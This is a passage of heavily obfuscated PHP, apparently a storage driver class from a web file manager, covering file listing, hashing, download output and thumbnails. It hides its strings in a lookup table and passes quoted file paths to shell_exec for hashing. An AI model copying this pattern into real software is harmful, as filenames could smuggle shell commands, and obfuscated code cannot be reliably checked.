$¸±„À·è = array($ù“¶«ş¼[76] => 0, $ù“¶«ş¼[77] => 0, $ù“¶«ş¼[78] => 0); $this->infoChildren($‘ú«—Ğ, $¸±„À·è); $£µ÷„ŠÛ[$ù“¶«ş¼[76]] = $¸±„À·è[$ù“¶«ş¼[76]]; $£µ÷„ŠÛ[$ù“¶«ş¼[79]] = array($ù“¶«ş¼[80] => $¸±„À·è[$ù“¶«ş¼[77]], $ù“¶«ş¼[81] => $¸±„À·è[$ù“¶«ş¼[78]]); $áˆ«Ú–ì[$‘ú«—Ğ] = $£µ÷„ŠÛ; } return $£µ÷„ŠÛ; } public function listPath($Ã¢¢ÈÅŞ, $œÍÕïò» = false) { } public function has($˜©´†Î¶, $÷ ‡»‰Æ = false, $à„Î“í = false) { } public function canRead($ÜÍ‰¯î£) { } public function canWrite($÷ì¹Ç‚Š) { } public function getContent($ŠÄÇÚş») { } public function setContent($åäÎÇÃå, $¿Ø°ªâ = '') { } protected function infoChildren($˜¹¯ò­£, &$ûÔ‘ğÍé) { $¦ÍŸ† =& $_SERVER[”ú…±Ú¥]; check_abort_echo(); $Á¢‰ÚÂ = $this->listPath($˜¹¯ò­£, !0); $Á¢‰ÚÂ = array_merge($Á¢‰ÚÂ[$¦ÍŸ†[82]], $Á¢‰ÚÂ[$¦ÍŸ†[83]]); foreach ($Á¢‰ÚÂ as $Œ  Â) { if ($Œ  Â[$¦ÍŸ†[33]] == $¦ÍŸ†[75]) { $ûÔ‘ğÍé[$¦ÍŸ†[78]]++; $”€°°ØÁ = $this->getPathInner($Œ  Â[$¦ÍŸ†[84]]); $this->infoChildren($”€°°ØÁ, $ûÔ‘ğÍé); } else { $ûÔ‘ğÍé[$¦ÍŸ†[77]]++; $ûÔ‘ğÍé[$¦ÍŸ†[76]] += $Œ  Â[$¦ÍŸ†[76]]; } } } public function fileSubstr($›£ñ°ªê, $¤˜×–“Ù, $ĞıÅ¤¦) { } public function listAll($¶”¨Ë›Ê) { } public function listAllMake($±ÑæıË, &$½±ÆÄ¾ë) { $®ò“íçõ =& $_SERVER[”ú…±Ú¥]; check_abort_echo(); $­ş”ŠÊ“ = $this->listPath($±ÑæıË, !0); if (!$­ş”ŠÊ“) { return; } $õÙ•ëã° = array_merge($­ş”ŠÊ“[$®ò“íçõ[82]], $­ş”ŠÊ“[$®ò“íçõ[83]]); foreach ($õÙ•ëã° as $‡ş’Ç‘ö) { $€ƒ¤‰°ü = $‡ş’Ç‘ö[$®ò“íçõ[33]] == $®ò“íçõ[75]; $ñ“áÍ§Ñ = array($®ò“íçõ[84] => $‡ş’Ç‘ö[$®ò“íçõ[84]], $®ò“íçõ[75] => $€ƒ¤‰°ü); if (isset($‡ş’Ç‘ö[$®ò“íçõ[76]])) { $ñ“áÍ§Ñ[$®ò“íçõ[76]] = $‡ş’Ç‘ö[$®ò“íçõ[76]]; } if (isset($‡ş’Ç‘ö[$®ò“íçõ[85]])) { $ñ“áÍ§Ñ[$®ò“íçõ[85]] = $‡ş’Ç‘ö[$®ò“íçõ[85]]; } if (!$€ƒ¤‰°ü) { $½±ÆÄ¾ë[] = $ñ“áÍ§Ñ; continue; } $½±ÆÄ¾ë[] = $ñ“áÍ§Ñ; $ˆ¼¸ôì× = $‡ş’Ç‘ö[$®ò“íçõ[84]]; $ øÅç„œ = $this->pathDriver; if (substr($‡ş’Ç‘ö[$®ò“íçõ[84]], 0, strlen($ øÅç„œ)) == $ øÅç„œ) { $ˆ¼¸ôì× = substr($ˆ¼¸ôì×, strlen($ øÅç„œ)); } $this->listAllMake($ˆ¼¸ôì×, $½±ÆÄ¾ë); } } public function listAllSimple($˜§ı·ì—, $ïœó‡¦Ï = false) { $÷êÒÃÉœ = $this->listAll($˜§ı·ì—); return $this->listAllSimpleMake($÷êÒÃÉœ, $this->getPathOuter($˜§ı·ì—), $ïœó‡¦Ï); } public function listAllSimpleMake($·ù£›ËÙ, $À³Õ³í€, $ñ§ïËä—) { $°Šè³ãİ =& $_SERVER[”ú…±Ú¥]; $Û–¾Æ‚ = array(); $À³Õ³í€ = rtrim(get_path_father($À³Õ³í€), $°Šè³ãİ[8]) . $°Šè³ãİ[8]; foreach ($·ù£›ËÙ as $å¬ôÕÓ) { $Êİñ¼Í = array($°Šè³ãİ[84] => $å¬ôÕÓ[$°Šè³ãİ[84]], $°Šè³ãİ[86] => $å¬ôÕÓ[$°Šè³ãİ[84]], $°Šè³ãİ[75] => $å¬ôÕÓ[$°Šè³ãİ[75]]); if (isset($å¬ôÕÓ[$°Šè³ãİ[76]]) && !$å¬ôÕÓ[$°Šè³ãİ[75]]) { $Êİñ¼Í[$°Šè³ãİ[76]] = $å¬ôÕÓ[$°Šè³ãİ[76]]; } if (isset($å¬ôÕÓ[$°Šè³ãİ[85]])) { $Êİñ¼Í[$°Šè³ãİ[85]] = $å¬ôÕÓ[$°Šè³ãİ[85]]; } if (is_array($å¬ôÕÓ[$°Šè³ãİ[87]])) { $Êİñ¼Í[$°Šè³ãİ[86]] = $å¬ôÕÓ[$°Šè³ãİ[87]][$°Šè³ãİ[84]]; $Êİñ¼Í[$°Šè³ãİ[76]] = $å¬ôÕÓ[$°Šè³ãİ[87]][$°Šè³ãİ[76]]; $Êİñ¼Í[$°Šè³ãİ[85]] = $å¬ôÕÓ[$°Šè³ãİ[87]][$°Šè³ãİ[85]]; } else { if (substr($å¬ôÕÓ[$°Šè³ãİ[84]], 0, strlen($À³Õ³í€)) == $À³Õ³í€) { $Êİñ¼Í[$°Šè³ãİ[84]] = substr($å¬ôÕÓ[$°Šè³ãİ[84]], strlen($À³Õ³í€)); } } $Ò‚á•Ä‡ = $å¬ôÕÓ[$°Šè³ãİ[75]] ? $°Šè³ãİ[8] : $°Šè³ãİ[12]; $Êİñ¼Í[$°Šè³ãİ[86]] = rtrim($Êİñ¼Í[$°Šè³ãİ[86]], $°Šè³ãİ[8]) . $Ò‚á•Ä‡; $Êİñ¼Í[$°Šè³ãİ[84]] = $°Šè³ãİ[8] . trim($Êİñ¼Í[$°Šè³ãİ[84]], $°Šè³ãİ[8]) . $Ò‚á•Ä‡; if (!$ñ§ïËä—) { $åÎÄ—È = explode($°Šè³ãİ[8], trim($Êİñ¼Í[$°Šè³ãİ[84]], $°Šè³ãİ[8])); $Êİñ¼Í[$°Šè³ãİ[84]] = $°Šè³ãİ[8] . implode($°Šè³ãİ[8], array_slice($åÎÄ—È, 1)) . $Ò‚á•Ä‡; } $Û–¾Æ‚[] = $Êİñ¼Í; } return array_sort_by($Û–¾Æ‚, $°Šè³ãİ[84]); } public function upload($„´û¬Ë‰, $ŠÀÎ¡¼·, $¿„‡‚‹ì = false, $ê…¨Ïû = REPEAT_REPLACE) { } public function uploadFileByID($„¬Ëä, $­³‹”Ç¨, $ÆûóêğÔ) { } public function uploadFileByPath($Ä¿ÆÁÂº, $´à Ô, $ÉŒ£ÑĞì = array()) { } public function isUploadServer() { $¯—ÊË¨’ =& $_SERVER[”ú…±Ú¥]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $¯—ÊË¨’[88]) { return !0; } return $GLOBALS[$¯—ÊË¨’[6]][$¯—ÊË¨’[89]][$¯—ÊË¨’[90]]; } public function isFileOutServer() { $Î²œŠÏÚ =& $_SERVER[”ú…±Ú¥]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $Î²œŠÏÚ[88]) { return !0; } return $GLOBALS[$Î²œŠÏÚ[6]][$Î²œŠÏÚ[89]][$Î²œŠÏÚ[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($ßÁåĞ„) { $òŸÉ×ë± =& $_SERVER[”ú…±Ú¥]; if (!$this->isCdnHost()) { return $ßÁåĞ„; } return str_replace(trim(get_url_root($ßÁåĞ„), $òŸÉ×ë±[8]), trim($this->cdnHost, $òŸÉ×ë±[8]), $ßÁåĞ„); } public function uploadLink($ªÄ‰¨íÀ, $ÖÓÇÆ¸Ó = 0) { $´÷³Ã¯¨ =& $_SERVER[”ú…±Ú¥]; if ($this->isUploadServer()) { return; } $­ËõÑåË = $this->getType(); if (!in_array($­ËõÑåË, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $¾ÊéœÅ­ = 1024 * 1024 * 10; $À×º¬Ç£ = $ÖÓÇÆ¸Ó <= $¾ÊéœÅ­ ? $´÷³Ã¯¨[92] : $´÷³Ã¯¨[93]; $úÁŒô«¯ = (!$ÖÓÇÆ¸Ó ? 1 : ceil($ÖÓÇÆ¸Ó / pow(1024, 3))) * 3600 * 4; $³»—Ìİ¾ = $this->{$À×º¬Ç£}($ªÄ‰¨íÀ, $úÁŒô«¯); if ($³»—Ìİ¾) { $³»—Ìİ¾[$´÷³Ã¯¨[94]] = $ªÄ‰¨íÀ; $³»—Ìİ¾[$´÷³Ã¯¨[95]] = $­ËõÑåË; } return $³»—Ìİ¾; } public function uploadFormData($¨€òâşÜ, $áâî† = 3600) { } public function multiUploadFormData($Öœğ†³, $Ãáú¬Ö÷ = 3600) { } public function download($˜ğü¾º, $²îÆìÁÀ) { } public function ext($ıàÇ¯å¯) { $ÜŒòß¨‰ =& $_SERVER[”ú…±Ú¥]; if (strpos($ıàÇ¯å¯, $ÜŒòß¨‰[8]) === -1) { $Şá‚¼¨û = $ıàÇ¯å¯; } else { $Şá‚¼¨û = $this->pathThis($ıàÇ¯å¯); } $®¯Õà = $ÜŒòß¨‰[12]; if (strstr($Şá‚¼¨û, $ÜŒòß¨‰[10])) { $®¯Õà = substr($Şá‚¼¨û, strrpos($Şá‚¼¨û, $ÜŒòß¨‰[10]) + 1); $®¯Õà = strtolower($®¯Õà); } if (strlen($®¯Õà) > 3 && preg_match($ÜŒòß¨‰[96], $®¯Õà, $Öã…¸)) { $®¯Õà = $ÜŒòß¨‰[12]; } return $®¯Õà; } public function pathThis($ ßœÚÒ„) { $×ø›îß× =& $_SERVER[”ú…±Ú¥]; $ ßœÚÒ„ = str_replace($×ø›îß×[97], $×ø›îß×[8], rtrim($ ßœÚÒ„, $×ø›îß×[8])); $Œí•à’ = strrpos($ ßœÚÒ„, $×ø›îß×[8]); if ($Œí•à’ === !1) { return $ ßœÚÒ„; } return substr($ ßœÚÒ„, $Œí•à’ + 1); } public function pathFather($€„ùÎÍ¥) { $Üöƒî§ =& $_SERVER[”ú…±Ú¥]; $€„ùÎÍ¥ = str_replace($Üöƒî§[97], $Üöƒî§[8], rtrim($€„ùÎÍ¥, $Üöƒî§[8])); $šäİäªì = strrpos($€„ùÎÍ¥, $Üöƒî§[8]); if ($šäİäªì === !1) { return $Üöƒî§[12]; } return substr($€„ùÎÍ¥, 0, $šäİäªì + 1); } public function hashSimple($ĞãÒºíÃ) { $È‘™º’æ =& $_SERVER[”ú…±Ú¥]; if (!$ĞãÒºíÃ) { return md5($È‘™º’æ[12]); } $Ó¹û—Ç = $this->size($ĞãÒºíÃ); $˜Æ›öúÈ = 200; $¡·ªÑË = 50; if ($Ó¹û—Ç <= $˜Æ›öúÈ * $¡·ªÑË) { return $this->hashMd5($ĞãÒºíÃ) . $Ó¹û—Ç; } $Í¸‰¶˜ = intval($Ó¹û—Ç / $¡·ªÑË); $§¨íŸŠ = $È‘™º’æ[12]; for ($½¿îî´û = 0; $½¿îî´û < $¡·ªÑË; $½¿îî´û++) { $§¨íŸŠ .= $this->fileSubstr($ĞãÒºíÃ, $Í¸‰¶˜ * $½¿îî´û, $˜Æ›öúÈ); } $§¨íŸŠ .= $this->fileSubstr($ĞãÒºíÃ, $Ó¹û—Ç - $˜Æ›öúÈ, $˜Æ›öúÈ); return md5($§¨íŸŠ) . $Ó¹û—Ç; } public static $md5Cache = array(); public function hashMd5($ªµŒ¾û¼) { if (!$ªµŒ¾û¼) { return md5($_SERVER[”ú…±Ú¥][12]); } $ªµŒ¾û¼ = $this->iconvSystem($ªµŒ¾û¼); if (isset(self::$md5Cache[$ªµŒ¾û¼])) { return self::$md5Cache[$ªµŒ¾û¼]; } self::$md5Cache[$ªµŒ¾û¼] = $this->hashMd5Shell($ªµŒ¾û¼); if (!self::$md5Cache[$ªµŒ¾û¼]) { self::$md5Cache[$ªµŒ¾û¼] = @md5_file($ªµŒ¾û¼); } return self::$md5Cache[$ªµŒ¾û¼]; } private function hashMd5Shell($Í‡âÒâ) { $×Ë´¹•ò =& $_SERVER[”ú…±Ú¥]; if (!$Í‡âÒâ) { return md5($×Ë´¹•ò[12]); } if (!function_exists($×Ë´¹•ò[98])) { return !1; } $¯àé¹á¼ = array($×Ë´¹•ò[99], $×Ë´¹•ò[100]); $°Öô¤ÏÃ = Cache::get($×Ë´¹•ò[101]); if (!$°Öô¤ÏÃ) { $é£èŠÇ = BASIC_PATH . $×Ë´¹•ò[102]; $åªï€­ = md5_file($é£èŠÇ); $°Öô¤ÏÃ = $×Ë´¹•ò[103]; foreach ($¯àé¹á¼ as $¿‹Õã‚Ñ) { $ÃˆÚ¾ŸÀ = shell_exec($¿‹Õã‚Ñ . "\x20\42{$é£èŠÇ}\x22"); if ($ÃˆÚ¾ŸÀ && substr(trim($ÃˆÚ¾ŸÀ), 0, 32) == $åªï€­) { $°Öô¤ÏÃ = $¿‹Õã‚Ñ; break; } } Cache::set($×Ë´¹•ò[101], $°Öô¤ÏÃ, 3600); } if ($°Öô¤ÏÃ == $×Ë´¹•ò[103]) { return !1; } $ÃˆÚ¾ŸÀ = shell_exec($°Öô¤ÏÃ . "\x20\42{$Í‡âÒâ}\x22"); $ÃˆÚ¾ŸÀ = str_replace($×Ë´¹•ò[104], $×Ë´¹•ò[12], $ÃˆÚ¾ŸÀ); return substr($ÃˆÚ¾ŸÀ, 0, 32); } public function link($•ÆªŠëñ) { return $•ÆªŠëñ; } public function fileOut($ù¤šçì†, $–ØêîéÙ = false, $âåŒ„×ë = false, $Çªƒ÷—ò = '') { $ƒ ¦òó =& $_SERVER[”ú…±Ú¥]; $this->cacheMethod(null, null); if (!$ù¤šçì† || !$this->exist($ù¤šçì†)) { show_json(LNG($ƒ ¦òó[105]), !1, $âåŒ„×ë); } $½¸ª› × = $this->getType() == $ƒ ¦òó[106]; $ÂÖÖø† = $GLOBALS[$ƒ ¦òó[6]][$ƒ ¦òó[89]][$ƒ ¦òó[107]][$ƒ ¦òó[108]]; $ŠÌ´¹Û« = (double) $GLOBALS[$ƒ ¦òó[6]][$ƒ ¦òó[89]][$ƒ ¦òó[107]][$ƒ ¦òó[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $•‚™«Â¬ = $this->infoFull($ù¤šçì†); $Áê³­„ï = $•‚™«Â¬[$ƒ ¦òó[76]]; $©ôë†Ğú = gmdate($ƒ ¦òó[110], $•‚™«Â¬[$ƒ ¦òó[85]]); $¸ÛìÇ½Ä = $âåŒ„×ë ? $âåŒ„×ë : $this->iconvApp($•‚™«Â¬[$ƒ ¦òó[32]]); $µàœûáÊ = 0; $²Ş¨×«Å = $Áê³­„ï - 1; $ÃÂ›Â = $this->ext($¸ÛìÇ½Ä); if (in_array($ÃÂ›Â, array($ƒ ¦òó[111], $ƒ ¦òó[112], $ƒ ¦òó[113], $ƒ ¦òó[114]))) { $ÃÂ›Â = $ƒ ¦òó[115]; } if (in_array($ÃÂ›Â, array($ƒ ¦òó[116]))) { $ÃÂ›Â = $ƒ ¦òó[117]; } if (!$Çªƒ÷—ò) { $Çªƒ÷—ò = md5($©ôë†Ğú . $this->hashSimple($ù¤šçì†)); } $Çªƒ÷—ò = $ƒ ¦òó[118] . $Çªƒ÷—ò . $ƒ ¦òó[118]; $È‚Ö…Å = get_file_mime($ÃÂ›Â); $õö”·™Ç = !0; $õö”·™Ç = isset($_GET[$ƒ ¦òó[119]]) ? !1 : !0; if ($–ØêîéÙ === !1 && !mime_support($È‚Ö…Å)) { $È‚Ö…Å = $ƒ ¦òó[120]; } header($ƒ ¦òó[121]); header($ƒ ¦òó[122] . $È‚Ö…Å); $ğƒ¾¯· = rawurlencode($¸ÛìÇ½Ä); $ğƒ¾¯· = $ƒ ¦òó[118] . $ğƒ¾¯· . $ƒ ¦òó[123] . $ğƒ¾¯·; if ($–ØêîéÙ) { header($ƒ ¦òó[124]); header($ƒ ¦òó[125] . $ğƒ¾¯·); } else { if ($õö”·™Ç) { header($ƒ ¦òó[126] . $ğƒ¾¯·); } } header($ƒ ¦òó[127] . gmdate($ƒ ¦òó[110], time() + 3600 * 24 * 30) . $ƒ ¦òó[128]); header($ƒ ¦òó[129]); header($ƒ ¦òó[130]); header($ƒ ¦òó[131]); if (isset($_SERVER[$ƒ ¦òó[132]]) && strtotime($_SERVER[$ƒ ¦òó[132]]) == $•‚™«Â¬[$ƒ ¦òó[85]]) { header($ƒ ¦òó[133], !0, 304); die; } if (isset($_SERVER[$ƒ ¦òó[134]]) && $_SERVER[$ƒ ¦òó[134]] == $Çªƒ÷—ò) { header($ƒ ¦òó[135] . $Çªƒ÷—ò, !0, 304); die; } header($ƒ ¦òó[135] . $Çªƒ÷—ò); header($ƒ ¦òó[136] . $©ôë†Ğú . $ƒ ¦òó[128]); header($ƒ ¦òó[137] . $¸ÛìÇ½Ä); header($ƒ ¦òó[138]); header($ƒ ¦òó[139] . $Áê³­„ï); header($ƒ ¦òó[140]); if (!$–ØêîéÙ && $ÃÂ›Â == $ƒ ¦òó[141]) { if ($Áê³­„ï > 1024 * 1024 * 5) { die; } $°Â‹±§› = $this->getContent($ù¤šçì†); $°Â‹±§› = Html::clearSVG($°Â‹±§›); header($ƒ ¦òó[142] . strlen($°Â‹±§›)); echo $°Â‹±§›; die; } $Æ´ß®é¼ = strtolower($_SERVER[$ƒ ¦òó[143]]); if ($½¸ª› × && $Æ´ß®é¼ && $ÂÖÖø†) { if (strstr($Æ´ß®é¼, $ƒ ¦òó[144])) { header($ƒ ¦òó[145] . $ù¤šçì†); } else { if (strstr($Æ´ß®é¼, $ƒ ¦òó[146])) { header($ƒ ¦òó[147] . $ù¤šçì†); } else { if (strstr($Æ´ß®é¼, $ƒ ¦òó[148])) { header($ƒ ¦òó[149] . $ù¤šçì†); } } } if ($ŠÌ´¹Û«) { header($ƒ ¦òó[150] . $ŠÌ´¹Û«); } return; } if (isset($_SERVER[$ƒ ¦òó[151]])) { if (preg_match($ƒ ¦òó[152], $_SERVER[$ƒ ¦òó[151]], $­Şó¿õ)) { $µàœûáÊ = intval($­Şó¿õ[1]); $µàœûáÊ = $µàœûáÊ <= 0 ? 0 : ($µàœûáÊ >= $²Ş¨×«Å ? $²Ş¨×«Å : $µàœûáÊ); if (!empty($­Şó¿õ[2])) { $“‹â©½ = intval($­Şó¿õ[2]); $²Ş¨×«Å = $“‹â©½ < $µàœûáÊ ? $µàœûáÊ : ($“‹â©½ >= $²Ş¨×«Å ? $²Ş¨×«Å : $“‹â©½); } } header($ƒ ¦òó[153]); header("\103\157\x6e\x74\145\x6e\x74\55\x52\141\156\x67\x65\72\x20\142\x79\164\x65\x73\x20{$µàœûáÊ}\55{$²Ş¨×«Å}\x2f" . $Áê³­„ï); } else { header($ƒ ¦òó[154]); } header($ƒ ¦òó[155]); $ŒĞéÔì = !0; if ($_SERVER[$ƒ ¦òó[156]] == $ƒ ¦òó[157] && $Áê³­„ï > 1204 * 1024 * 1024 * 2) { $ŒĞéÔì = !1; } if ($ŒĞéÔì) { header($ƒ ¦òó[158] . ($²Ş¨×«Å - $µàœûáÊ + 1)); } if ($_SERVER[$ƒ ¦òó[159]] == $ƒ ¦òó[160]) { return; } $ÕéÎÆ¬ç = 1024 * 100; $âŒ¬œÉÊ = 0; if ($ŠÌ´¹Û«) { $âŒ¬œÉÊ = intval(1000 * 1000 * ($ÕéÎÆ¬ç / $ŠÌ´¹Û«)); } while ($µàœûáÊ <= $²Ş¨×«Å) { $©Êúƒ º = timeFloat(); check_abort(); $˜ÒèÂØ = $²Ş¨×«Å - $µàœûáÊ + 1; if ($˜ÒèÂØ <= $ÕéÎÆ¬ç) { $ÕéÎÆ¬ç = $˜ÒèÂØ; } echo $this->fileSubstr($ù¤šçì†, $µàœûáÊ, $ÕéÎÆ¬ç); $µàœûáÊ += $ÕéÎÆ¬ç; if ($ÕéÎÆ¬ç == $˜ÒèÂØ) { $µàœûáÊ = $²Ş¨×«Å + 1; } if ($âŒ¬œÉÊ) { $´òåŞ¶À = intval(1000 * 1000 * (timeFloat() - $©Êúƒ º)); $ä––­‰ = $âŒ¬œÉÊ - $´òåŞ¶À; if ($ä––­‰ > 5) { usleep($ä––­‰); } } } } public function fileOutServer($ïá¿èï, $ã±‚Â¼Ú = false, $‰°…ßü = false, $ÚòßŸšú = '') { $this->fileOut($ïá¿èï, $ã±‚Â¼Ú, $‰°…ßü, $ÚòßŸšú); } public function fileOutLink($—Õıª„à) { header($_SERVER[”ú…±Ú¥][161] . $—Õıª„à); die; } public function cacheMethod($ùã‹»ï, $Ó±ç„óÑ, $ïªê±õ = null) { $´˜ı´ì =& $_SERVER[”ú…±Ú¥]; static $°›Öä‘‡ = array(); $³Æ˜â¾Ç = $Ó±ç„óÑ ? ltrim($this->getPathOuter($Ó±ç„óÑ), $´˜ı´ì[8]) : $´˜ı´ì[12]; $ÏŞÂçé£ = $´˜ı´ì[162] . $ùã‹»ï . $´˜ı´ì[163] . rtrim($³Æ˜â¾Ç, $´˜ı´ì[8]); if (is_null($ùã‹»ï)) { $°›Öä‘‡ = array(); return; } if (is_null($Ó±ç„óÑ)) { foreach ($°›Öä‘‡ as $ÏŞÂçé£ => $Â…×Ê±Ï) { if (!strstr($ÏŞÂçé£, $´˜ı´ì[162] . $ùã‹»ï . $´˜ı´ì[164])) { continue; } unset($°›Öä‘‡[$ÏŞÂçé£]); } return; } if (!is_null($ïªê±õ)) { $°›Öä‘‡[$ÏŞÂçé£] = $ïªê±õ; return; } $³½Îá¢Ê = isset($°›Öä‘‡[$ÏŞÂçé£]) ? $°›Öä‘‡[$ÏŞÂçé£] : null; if (!is_null($³½Îá¢Ê)) { return $³½Îá¢Ê; } $³½Îá¢Ê = $this->{$ùã‹»ï}($Ó±ç„óÑ); $°›Öä‘‡[$ÏŞÂçé£] = $³½Îá¢Ê; return $³½Îá¢Ê; } public function cacheMethodInfoSet($şéß–öã, $©½¬«´Í, $Ø€ç÷ª = false) { $äöï§¡¥ =& $_SERVER[”ú…±Ú¥]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($äöï§¡¥[165], $şéß–öã, $©½¬«´Í); $this->cacheMethod($äöï§¡¥[166], $şéß–öã, $©½¬«´Í ? !1 : !0); if (is_array($Ø€ç÷ª)) { $this->cacheMethod($äöï§¡¥[167], $şéß–öã, $Ø€ç÷ª); } } public function fileOutImage($öã¡ÔÊ™, $†À›‘Øª = 250) { $°¾¹€¡â =& $_SERVER[”ú…±Ú¥]; set_timeout(); if (substr($öã¡ÔÊ™, 0, 4) == $°¾¹€¡â[148]) { $this->fileOutLink($öã¡ÔÊ™); } $ê‘˜‰å = $this->info($öã¡ÔÊ™); $‚ÇšÆ™¢ = $ê‘˜‰å[$°¾¹€¡â[32]]; $®˜ÅåùÃ = !1; if (isset($GLOBALS[$°¾¹€¡â[168]]) && $GLOBALS[$°¾¹€¡â[168]][$°¾¹€¡â[84]] == $ê‘˜‰å[$°¾¹€¡â[84]]) { $Í‘ÍÉëÅ = $GLOBALS[$°¾¹€¡â[168]][$°¾¹€¡â[169]]; if (!$ê‘˜‰å[$°¾¹€¡â[170]]) { $ê‘˜‰å[$°¾¹€¡â[170]] = $GLOBALS[$°¾¹€¡â[168]]; } if (isset($Í‘ÍÉëÅ[$°¾¹€¡â[171]])) { if ($Í‘ÍÉëÅ[$°¾¹€¡â[171]] <= $†À›‘Øª && $Í‘ÍÉëÅ[$°¾¹€¡â[172]] <= $†À›‘Øª) { $®˜ÅåùÃ = !0; } } $‚ÇšÆ™¢ = $ê‘˜‰å[$°¾¹€¡â[170]][$°¾¹€¡â[32]]; } if ($ê‘˜‰å[$°¾¹€¡â[76]] <= 1024 * 50 || $®˜ÅåùÃ || !function_exists($°¾¹€¡â[173]) || $ê‘˜‰å[$°¾¹€¡â[174]] == $°¾¹€¡â[175]) { return $this->fileOut($öã¡ÔÊ™, !1, $‚ÇšÆ™¢); } if (isset($ê‘˜‰å[$°¾¹€¡â[170]][$°¾¹€¡â[176]])) { $„ã…ÖÇ = $ê‘˜‰å[$°¾¹€¡â[170]][$°¾¹€¡â[176]]; } else { if (isset($ê‘˜‰å[$°¾¹€¡â[170]][$°¾¹€¡â[177]])) { $„ã…ÖÇ = $ê‘˜‰å[$°¾¹€¡â[170]][$°¾¹€¡â[177]]; } } if (!$„ã…ÖÇ) { $„ã…ÖÇ = md5("{$ê‘˜‰å[$°¾¹€¡â[32]]}\137{$ê‘˜‰å[$°¾¹€¡â[84]]}\x5f{$ê‘˜‰å[$°¾¹€¡â[76]]}\x5f{$†À›‘Øª}"); } $ÍÚçİŒ¢ = "{$„ã…ÖÇ}\x5f{$†À›‘Øª}\x2e\160\156\147"; if (!($«´³¢àó = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $°¾¹€¡â[178]))) { $ÒÚ¹Œ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $°¾¹€¡â[179]); } else { $ÒÚ¹Œ = KodIO::make($«´³¢àó); } if ($«´³¢àó = IO::fileNameExist($ÒÚ¹Œ, $ÍÚçİŒ¢)) { $æÉôˆ˜” = KodIO::make($«´³¢àó); return IO::fileOut($æÉôˆ˜”, !1, $‚ÇšÆ™¢); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } $æÉôˆ˜” = DATA_THUMB . $ÍÚçİŒ¢; del_file($æÉôˆ˜”); if (!@file_exists($æÉôˆ˜”)) { $ƒÚşÕ‡¢ = TEMP_FILES; if (!is_dir($ƒÚşÕ‡¢)) { mk_dir($ƒÚşÕ‡¢); } $°œ‹†Ü¹ = $ƒÚşÕ‡¢ . $„ã…ÖÇ . $°¾¹€¡â[10] . $ê‘˜‰å[$°¾¹€¡â[174]]; if (!@file_exists($°œ‹†Ü¹)) { $°œ‹†Ü¹ = $this->download($öã¡ÔÊ™, $°œ‹†Ü¹); } ImageThumb::createThumb($°œ‹†Ü¹, $æÉôˆ˜”, $†À›‘Øª, $†À›‘Øª * 10); } if (!file_exists($æÉôˆ˜”) || filesize($æÉôˆ˜”) < 100) { return @file_exists($°œ‹†Ü¹) ? IO::fileOut($°œ‹†Ü¹) : $this->fileOut($öã¡ÔÊ™); } if (!($İšß¬Ö = IO::move($æÉôˆ˜”, $ÒÚ¹Œ))) { return IO::fileOut($æÉôˆ˜”); } del_file($æÉôˆ˜”); IO::fileOut($İšß¬Ö); } public function fileOutImageServer($šåßÓŞ¬, $¾·÷ÏÂÏ = 250) { $this->fileOutImage($šåßÓŞ¬, $¾·÷ÏÂÏ); } public function fileNameAuto($ÃÆñœİú, $ ‘íÍ‚õ, $³ Ç÷Ç´ = REPEAT_RENAME, $ú‹ğ—»ô = false) { $É«»šÄğ =& $_SERVER[”ú…±Ú¥]; $Ñğ¶É™¸ = $ÃÆñœİú === $É«»šÄğ[12] ? $ ‘íÍ‚õ : rtrim($ÃÆñœİú, $É«»šÄğ[8]) . $É«»šÄğ[8] . $ ‘íÍ‚õ; if ($³ Ç÷Ç´ == REPEAT_REPLACE || !$this->exist($Ñğ¶É™¸) || $ú‹ğ—»ô && $³ Ç÷Ç´ != REPEAT_RENAME_FOLDER) { return $ ‘íÍ‚õ; } if ($³ Ç÷Ç´ == REPEAT_SKIP) { return !1; } $İ÷ÈÉÑ = $É«»šÄğ[10] . get_path_ext($ ‘íÍ‚õ); $İ÷ÈÉÑ = $İ÷ÈÉÑ == $É«»šÄğ[10] || $ú‹ğ—»ô ? $É«»šÄğ[12] : $İ÷ÈÉÑ; $˜¾âè†º = 1; $“Ö×”ÏÂ = substr($ ‘íÍ‚õ, 0, strlen($ ‘íÍ‚õ) - strlen($İ÷ÈÉÑ)); $õöˆ˜Ûê = $“Ö×”ÏÂ . "\50{$˜¾âè†º}\51{$İ÷ÈÉÑ}"; while ($this->exist(rtrim($ÃÆñœİú, $É«»šÄğ[8]) . $É«»šÄğ[8] . $õöˆ˜Ûê)) { $õöˆ˜Ûê = $“Ö×”ÏÂ . "\50{$˜¾âè†º}\51{$İ÷ÈÉÑ}"; $˜¾âè†º++; } return $õöˆ˜Ûê; } private function fileNameAutoList($ÃúğÉÍØ, $¨Ğ‘Ò²ò, $Æ¶ê±Ë = false) { $³†–ÕÈâ =& $_SERVER[”ú…±Ú¥]; $´„ÂÉ½ê = $this->listPath($ÃúğÉÍØ, !0); $´„ÂÉ½ê = array_merge($´„ÂÉ½ê[$³†–ÕÈâ[82]], $´„ÂÉ½ê[$³†–ÕÈâ[83]]); $ìÌ²Ø‹ = array_to_keyvalue($´„ÂÉ½ê, $³†–ÕÈâ[12], $³†–ÕÈâ[32]); $÷æ¹ºØ× = $³†–ÕÈâ[10] . get_path_ext($¨Ğ‘Ò²ò); $÷æ¹ºØ× = $÷æ¹ºØ× == $³†–ÕÈâ[10] || $Æ¶ê±Ë ? $³†–ÕÈâ[12] : $÷æ¹ºØ×; $£©êÍ¹ü = substr($¨Ğ‘Ò²ò, 0, strlen($¨Ğ‘Ò²ò) - strlen($÷æ¹ºØ×)); $×ß‡Åã = $£©êÍ¹ü . "\x28\x30\x29{$÷æ¹ºØ×}"; for ($ÔóÂ¦áÓ = 1; $ÔóÂ¦áÓ <= count($ìÌ²Ø‹) + 1; $ÔóÂ¦áÓ++) { $×ß‡Åã = $£©êÍ¹ü . "\50{$ÔóÂ¦áÓ}\51{$÷æ¹ºØ×}"; if (!in_array_not_case($×ß‡Åã, $ìÌ²Ø‹)) { return $×ß‡Åã; } } return $×ß‡Åã; 